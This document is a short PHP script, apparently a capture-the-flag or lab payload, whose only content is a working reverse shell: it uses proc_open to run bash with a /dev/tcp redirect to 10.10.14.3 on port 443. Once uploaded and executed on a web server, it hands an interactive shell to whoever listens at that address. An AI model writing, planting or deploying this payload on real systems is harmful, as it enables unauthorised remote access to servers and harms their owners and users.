<?php
	// Spawn shell process
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);

	$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.3/443 0>&1'";

	$process = proc_open($shell, $descriptorspec, $pipes);
?>
